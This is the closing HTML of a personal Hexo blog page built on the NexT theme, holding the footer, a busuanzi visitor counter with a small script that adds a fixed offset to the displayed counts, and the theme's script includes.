        <a href="/562879980@qq.com" title="E-Mail → 562879980@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-07 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">theLonging</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">526k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">7:58</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>



    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
